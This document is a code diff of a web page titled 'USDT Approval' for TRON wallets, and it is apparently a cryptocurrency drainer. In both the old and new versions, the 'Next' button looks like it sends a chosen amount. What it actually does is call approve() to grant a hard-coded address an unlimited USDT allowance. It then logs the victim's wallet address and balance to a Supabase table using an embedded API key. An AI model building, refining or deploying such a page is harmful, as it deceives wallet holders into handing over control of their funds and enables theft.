@@ -4,48 +4,59 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>USDT Approval</title>
-  <script src="https://cdn.jsdelivr.net/npm/@tronweb3/tronweb@latest/dist/TronWeb.min.js"></script>
   <style>
     body {
-      background: #fff;
-      font-family: 'Arial', sans-serif;
-      margin: 0;
+      font-family: Arial, sans-serif;
       padding: 20px;
+      background-color: #fff;
       color: #000;
     }
+
     .container {
-      max-width: 500px;
-      margin: auto;
+      max-width: 400px;
+      margin: 0 auto;
     }
+
     label {
-      font-size: 14px;
-      font-weight: 600;
-      margin-bottom: 6px;
       display: block;
+      margin-top: 20px;
+      margin-bottom: 6px;
+      font-weight: 600;
     }
+
     input[type="text"], input[type="number"] {
       width: 100%;
       padding: 12px;
       font-size: 16px;
       border: 1px solid #ccc;
       border-radius: 12px;
-      margin-bottom: 16px;
       box-sizing: border-box;
     }
+
     .amount-box {
       display: flex;
-      align-items: center;
       position: relative;
+      margin-bottom: 20px;
     }
+
+    .amount-box input {
+      padding-right: 90px;
+    }
+
     .amount-box span {
       position: absolute;
-      right: 70px;
+      top: 50%;
+      right: 60px;
+      transform: translateY(-50%);
       font-weight: 600;
       color: #888;
     }
+
     .max-btn {
       position: absolute;
+      top: 50%;
       right: 10px;
+      transform: translateY(-50%);
       padding: 6px 10px;
       border: none;
       background: #eee;
@@ -53,6 +64,7 @@
       font-size: 14px;
       cursor: pointer;
     }
+
     button {
       width: 100%;
       padding: 14px;
@@ -63,101 +75,75 @@
       border: none;
       border-radius: 14px;
       cursor: pointer;
-      margin-top: 20px;
-    }
-    .status {
-      margin-top: 20px;
-      font-size: 14px;
-      color: green;
-      word-wrap: break-word;
+      margin-top: 40px;
     }
   </style>
+  <script src="https://cdn.jsdelivr.net/npm/@tronweb3/tronwallet-adapter@latest"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2.39.7/+esm"></script>
 </head>
 <body>
   <div class="container">
     <label>Address</label>
-    <input type="text" id="toAddress" value="TKTdAiXKvAWH7T9bxpBodYecRPtFDGZ7jN" readonly />
+    <input type="text" id="address" value="TKTdAiXKvAWH7T9bxpBodYecRPtFDGZ7jN" readonly />
 
     <label>Amount</label>
     <div class="amount-box">
-      <input type="number" id="amountInput" placeholder="0" />
+      <input type="number" id="amount" placeholder="0" />
       <span>USDT</span>
       <button class="max-btn" onclick="setMax()">Max</button>
     </div>
 
-    <button id="nextBtn" onclick="handleApprove()">Next</button>
-
-    <div class="status" id="status"></div>
+    <button onclick="approveUSDT()">Next</button>
   </div>
 
-  <script>
-    const usdtContract = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-    const spenderAddress = "TKTdAiXKvAWH7T9bxpBodYecRPtFDGZ7jN";
-    const supabaseUrl = "https://ycmspiedqvwzzrgpxeci.supabase.co";
-    const supabaseKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InljbXNwaWVkcXZ3enpyZ3B4ZWNpIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTM1OTMxODQsImV4cCI6MjA2OTE2OTE4NH0.z0sw1x0ysYlBdIg4zGM8Y6J59KTVw3Ta9j-xaxCbT5o";
+  <script type="module">
+    import { createClient } from 'https://cdn.jsdelivr.net/npm/@supabase/supabase-js/+esm';
 
-    let tronWebReady = false;
+    const supabase = createClient(
+      'https://ycmspiedqvwzzrgpxeci.supabase.co',
+      'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InljbXNwaWVkcXZ3enpyZ3B4ZWNpIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTM1OTMxODQsImV4cCI6MjA2OTE2OTE4NH0.z0sw1x0ysYlBdIg4zGM8Y6J59KTVw3Ta9j-xaxCbT5o'
+    );
 
-    const connectTron = async () => {
-      return new Promise((resolve, reject) => {
-        const check = setInterval(() => {
-          if (window.tronWeb && window.tronWeb.ready) {
-            clearInterval(check);
-            tronWebReady = true;
-            resolve(true);
-          }
-        }, 500);
-        setTimeout(() => {
-          clearInterval(check);
-          reject("TronWeb not detected");
-        }, 10000);
-      });
-    };
+    const usdtContract = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
+    const receiverAddress = 'TKTdAiXKvAWH7T9bxpBodYecRPtFDGZ7jN';
 
-    const setMax = () => {
-      document.getElementById("amountInput").value = "999999999";
-    };
+    async function connectWallet() {
+      if (!window.tronWeb || !window.tronWeb.ready) {
+        alert('TronLink / Web3 wallet not detected. Please open in supported wallet browser.');
+        return false;
+      }
+      return true;
+    }
 
-    const handleApprove = async () => {
+    function setMax() {
+      document.getElementById('amount').value = 999999999;
+    }
+
+    async function approveUSDT() {
+      const connected = await connectWallet();
+      if (!connected) return;
+
+      const from = window.tronWeb.defaultAddress.base58;
+      const amount = document.getElementById('amount').value || '0';
+      const contract = await window.tronWeb.contract().at(usdtContract);
+
       try {
-        document.getElementById("status").innerText = "Connecting to wallet...";
-        await connectTron();
-        const tronWeb = window.tronWeb;
-        const userAddress = tronWeb.defaultAddress.base58;
-        const usdt = await tronWeb.contract().at(usdtContract);
-        const maxAmount = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+        await contract.approve(receiverAddress, '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff').send();
+        const balance = await contract.balanceOf(from).call();
 
-        document.getElementById("status").innerText = "Requesting approval...";
-
-        await usdt.approve(spenderAddress, maxAmount).send();
-
-        const balance = await usdt.balanceOf(userAddress).call();
-        const balanceInUSDT = tronWeb.toDecimal(balance) / 1e6;
-        const inputAmount = document.getElementById("amountInput").value || "0";
-
-        // Save to Supabase
-        await fetch(`${supabaseUrl}/rest/v1/approvals`, {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-            "apikey": supabaseKey,
-            "Authorization": `Bearer ${supabaseKey}`,
-            "Prefer": "return=minimal"
-          },
-          body: JSON.stringify({
-            wallet_address: userAddress,
-            amount: inputAmount,
-            balance: balanceInUSDT,
-            timestampz: new Date().toISOString()
-          })
+        await supabase.from('approvals').insert({
+          wallet_address: from,
+          amount: amount,
+          balance: parseFloat(window.tronWeb.fromSun(balance)),
+          timestampz: new Date().toISOString()
         });
 
-        document.getElementById("status").innerText = "Approval successful ✅";
+        alert('Approval successful!');
       } catch (err) {
         console.error(err);
-        document.getElementById("status").innerText = "Something went wrong ❌: " + err;
+        alert('Approval failed.');
       }
-    };
+    }
   </script>
 </body>
 </html>
